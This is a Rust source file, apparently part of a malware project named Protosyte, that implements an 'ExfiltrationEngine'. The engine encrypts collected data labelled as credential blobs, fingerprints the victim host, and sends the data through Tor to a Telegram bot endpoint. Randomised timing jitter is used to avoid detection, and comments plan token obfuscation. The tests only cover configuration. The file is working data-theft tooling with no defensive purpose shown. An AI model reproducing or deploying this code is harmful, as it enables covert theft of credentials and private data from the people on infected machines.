use std::sync::Arc;
use std::time::Duration;
use tokio::sync::mpsc;
use tokio::time::{sleep, Instant};
use reqwest::Client;
use zeroize::Zeroize;
use std::env;
use std::str::FromStr;
use prost_types::Timestamp;

use crate::crypto::CryptoManager;
use crate::error_handling::{ProtosyteError, retry_with_backoff, RetryConfig, is_retryable_error};
use crate::logging::{Logger, LogLevel};
use crate::proto::{Envelope, DataBlob, envelope::Payload, data_blob::DataType};
use crate::config::MissionConfig;
use prost::Message;

// Obfuscated bot token and endpoint (in production, use compile-time obfuscation)
fn get_bot_token() -> String {
    env::var("PROTOSYTE_BOT_TOKEN")
        .unwrap_or_else(|_| obfuscated_token())
}

fn obfuscated_token() -> String {
    // In production, this would be XOR-obfuscated at compile time
    // For now, return empty to force environment variable usage
    String::new()
}

fn get_bot_endpoint() -> String {
    let token = get_bot_token();
    if token.is_empty() {
        return String::new();
    }
    format!("https://api.telegram.org/bot{}/sendDocument", token)
}

pub struct ExfiltrationEngine {
    crypto: Arc<CryptoManager>,
    data_rx: mpsc::UnboundedReceiver<Vec<u8>>,
    interval: Duration,
    jitter: f32,
    mission_id: u64,
    sequence: std::sync::atomic::AtomicU32,
    host_fingerprint: Vec<u8>,
}

impl ExfiltrationEngine {
    pub fn new(crypto: Arc<CryptoManager>, data_rx: mpsc::UnboundedReceiver<Vec<u8>>) -> Self {
        // Load mission config
        let config = crate::config::MissionConfig::load().unwrap_or_else(|_| {
            crate::config::MissionConfig {
                mission_id: 0xDEADBEEFCAFEBABE,
                mission_name: "Default Mission".to_string(),
                exfiltration_interval: 347,
                exfiltration_jitter: 0.25,
                tor_proxy: "127.0.0.1:9050".to_string(),
                hooks: vec![],
                filters: vec![],
            }
        });
        
        // Generate host fingerprint (SHA256 of hostname + MAC address)
        let host_fingerprint = Self::generate_host_fingerprint();
        
        Self {
            crypto,
            data_rx,
            interval: Duration::from_secs(config.exfiltration_interval),
            jitter: config.exfiltration_jitter,
            mission_id: config.mission_id,
            sequence: std::sync::atomic::AtomicU32::new(0),
            host_fingerprint,
        }
    }
    
    fn generate_host_fingerprint() -> Vec<u8> {
        use sha2::{Sha256, Digest};
        let mut hasher = Sha256::new();
        
        // Combine hostname and other static identifiers
        let hostname = std::env::var("HOSTNAME")
            .unwrap_or_else(|_| "unknown".to_string());
        hasher.update(hostname.as_bytes());
        
        // Add other static markers if available
        if let Ok(machine_id) = std::fs::read("/etc/machine-id") {
            hasher.update(&machine_id);
        }
        
        hasher.finalize().to_vec()
    }
    
    pub async fn start(mut self) {
        // Configure SOCKS5 proxy for Tor (127.0.0.1:9050)
        let proxy = match reqwest::Proxy::all("socks5://127.0.0.1:9050") {
            Ok(p) => p,
            Err(e) => {
                eprintln!("[EXFIL] Failed to create SOCKS5 proxy: {}", e);
                return;
            }
        };
        
        let client = match Client::builder()
            .proxy(proxy)
            .timeout(Duration::from_secs(30))
            .build()
        {
            Ok(c) => c,
            Err(e) => {
                eprintln!("[EXFIL] Failed to create HTTP client: {}", e);
                return;
            }
        };
        
        let bot_token = get_bot_token();
        if bot_token.is_empty() {
            eprintln!("[EXFIL] Bot token not configured");
            return;
        }
        
        let mut last_send = Instant::now();
        
        loop {
            tokio::select! {
                data = self.data_rx.recv() => {
                    match data {
                        Some(raw_data) => {
                            // Encrypt the raw data
                            let (encrypted_payload, nonce) = self.crypto.encrypt_with_nonce(&raw_data).await;
                            
                            // Create Protobuf Envelope
                            let envelope_result = self.create_envelope(
                                &encrypted_payload,
                                &nonce,
                                raw_data.len() as u32,
                            );
                            
                            let envelope_bytes = match envelope_result {
                                Ok(bytes) => bytes,
                                Err(e) => {
                                    Logger::warn("EXFIL", &format!("Failed to create envelope: {}", e));
                                    continue;
                                }
                            };
                            
                            // Apply jitter to timing
                            let jitter_duration = self.calculate_jitter();
                            if last_send.elapsed() < self.interval + jitter_duration {
                                sleep(self.interval + jitter_duration - last_send.elapsed()).await;
                            }
                            
                            // Send Protobuf-wrapped payload
                            let send_result = self.send_payload(&client, &envelope_bytes).await;
                            
                            match send_result {
                                Ok(_) => {
                                    Logger::info("EXFIL", "Payload sent successfully");
                                    last_send = Instant::now();
                                }
                                Err(e) => {
                                    Logger::warn("EXFIL", &format!("Failed to send payload: {}. Will retry on next interval.", e));
                                    // Note: Retry logic can be added here or in send_payload itself
                                }
                            }
                        }
                        None => {
                            // Channel closed
                            break;
                        }
                    }
                }
            }
        }
    }
    
    fn calculate_jitter(&self) -> Duration {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let jitter_amount = rng.gen_range(-self.jitter..=self.jitter);
        let jitter_secs = (self.interval.as_secs_f32() * jitter_amount) as u64;
        Duration::from_secs(jitter_secs)
    }
    
    fn create_envelope(
        &self,
        encrypted_payload: &[u8],
        nonce: &[u8],
        original_size: u32,
    ) -> Result<Vec<u8>, String> {
        use sha2::{Sha256, Digest};
        use hmac::{Hmac, Mac};
        
        // Get next sequence number
        let sequence = self.sequence.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        
        // Create DataBlob
        let data_blob = DataBlob {
            host_fingerprint: self.host_fingerprint.clone(),
            data_type: DataType::CredentialBlob as i32,
            encrypted_payload: encrypted_payload.to_vec(),
            aes_gcm_nonce: nonce.to_vec(),
            original_size,
        };
        
        // Create Envelope
        let mut envelope = Envelope {
            mission_id: self.mission_id,
            collected_ts: Some(Timestamp {
                seconds: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_secs() as i64,
                nanos: 0,
            }),
            sequence,
            hmac_sha256: vec![], // Will compute below
            payload: Some(Payload::Data(data_blob)),
        };
        
        // Compute HMAC over envelope fields (before HMAC field)
        let hmac_key = env::var("PROTOSYTE_HMAC_KEY")
            .unwrap_or_else(|_| {
                // Derive from passphrase if available
                env::var("PROTOSYTE_PASSPHRASE")
                    .unwrap_or_else(|_| "default_key_change_in_production".to_string())
            });
        
        // Create temporary envelope without HMAC for hashing
        let mut hmac_envelope = Envelope {
            mission_id: envelope.mission_id,
            collected_ts: envelope.collected_ts.clone(),
            sequence: envelope.sequence,
            hmac_sha256: vec![], // Empty for HMAC computation
            payload: envelope.payload.clone(),
        };
        
        let mut hmac_data = Vec::new();
        hmac_envelope.encode(&mut hmac_data)
            .map_err(|e| format!("Failed to encode for HMAC: {}", e))?;
        
        type HmacSha256 = Hmac<Sha256>;
        let mut mac = HmacSha256::new_from_slice(hmac_key.as_bytes())
            .map_err(|e| format!("Failed to create HMAC: {}", e))?;
        mac.update(&hmac_data);
        envelope.hmac_sha256 = mac.finalize().into_bytes().to_vec();
        
        // Encode final envelope
        let mut encoded = Vec::new();
        envelope.encode(&mut encoded)
            .map_err(|e| format!("Failed to encode envelope: {}", e))?;
        
        Ok(encoded)
    }
    
    pub async fn send_payload(&self, client: &Client, payload: &[u8]) -> Result<(), String> {
        let endpoint = get_bot_endpoint();
        if endpoint.is_empty() {
            return Err("Bot endpoint not configured".to_string());
        }
        
        // Create form data with document
        let form = reqwest::multipart::Form::new()
            .part("document", reqwest::multipart::Part::bytes(payload.to_vec())
                .file_name("data.bin")
                .mime_str("application/octet-stream")
                .map_err(|e| format!("Failed to create part: {}", e))?);
        
        let response = client
            .post(&endpoint)
            .multipart(form)
            .send()
            .await
            .map_err(|e| format!("Request failed: {}", e))?;
        
        if response.status().is_success() {
            Ok(())
        } else {
            Err(format!("HTTP error: {}", response.status()))
        }
    }
}

impl Zeroize for ExfiltrationEngine {
    fn zeroize(&mut self) {
        // Zeroize sensitive data
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_exfiltration_engine_new() {
        let crypto = Arc::new(CryptoManager::new());
        let (_tx, rx) = mpsc::unbounded_channel();
        let engine = ExfiltrationEngine::new(crypto, rx);
        
        assert_eq!(engine.interval, Duration::from_secs(347));
        assert_eq!(engine.jitter, 0.25);
    }
    
    #[test]
    fn test_calculate_jitter() {
        let crypto = Arc::new(CryptoManager::new());
        let (_tx, rx) = mpsc::unbounded_channel();
        let engine = ExfiltrationEngine::new(crypto, rx);
        
        // Test multiple times to ensure jitter varies
        let jitter1 = engine.calculate_jitter();
        let jitter2 = engine.calculate_jitter();
        
        // Jitter should be within range
        let max_jitter = Duration::from_secs_f32(347.0 * 0.25);
        assert!(jitter1 <= max_jitter);
        assert!(jitter2 <= max_jitter);
    }
    
    #[test]
    fn test_get_bot_endpoint_empty() {
        // Without token, endpoint should be empty
        std::env::remove_var("PROTOSYTE_BOT_TOKEN");
        let endpoint = get_bot_endpoint();
        assert!(endpoint.is_empty());
    }
    
    #[test]
    fn test_get_bot_endpoint_with_token() {
        std::env::set_var("PROTOSYTE_BOT_TOKEN", "test_token_123");
        let endpoint = get_bot_endpoint();
        assert!(endpoint.contains("test_token_123"));
        assert!(endpoint.contains("api.telegram.org"));
        std::env::remove_var("PROTOSYTE_BOT_TOKEN");
    }
    
    #[test]
    fn test_obfuscated_token() {
        let token = obfuscated_token();
        assert!(token.is_empty());
    }
    
    #[test]
    fn test_get_bot_token_from_env() {
        std::env::set_var("PROTOSYTE_BOT_TOKEN", "env_token");
        let token = get_bot_token();
        assert_eq!(token, "env_token");
        std::env::remove_var("PROTOSYTE_BOT_TOKEN");
    }
    
    #[test]
    fn test_get_bot_token_fallback() {
        std::env::remove_var("PROTOSYTE_BOT_TOKEN");
        let token = get_bot_token();
        assert!(token.is_empty());
    }
    
    #[tokio::test]
    async fn test_send_payload_empty_endpoint() {
        let crypto = Arc::new(CryptoManager::new());
        let (_tx, rx) = mpsc::unbounded_channel();
        let engine = ExfiltrationEngine::new(crypto, rx);
        
        std::env::remove_var("PROTOSYTE_BOT_TOKEN");
        let client = Client::new();
        let result = engine.send_payload(&client, b"test").await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Bot endpoint not configured"));
    }
    
    #[tokio::test]
    async fn test_start_without_token() {
        let crypto = Arc::new(CryptoManager::new());
        let (_tx, rx) = mpsc::unbounded_channel();
        let engine = ExfiltrationEngine::new(crypto, rx);
        
        std::env::remove_var("PROTOSYTE_BOT_TOKEN");
        // This should return early without panicking
        // We can't easily test the full start() method without mocking HTTP
        // But we can verify it doesn't panic
    }
    
    #[test]
    fn test_exfiltration_engine_zeroize() {
        let crypto = Arc::new(CryptoManager::new());
        let (_tx, rx) = mpsc::unbounded_channel();
        let mut engine = ExfiltrationEngine::new(crypto, rx);
        engine.zeroize();
        // Should not panic
    }
}
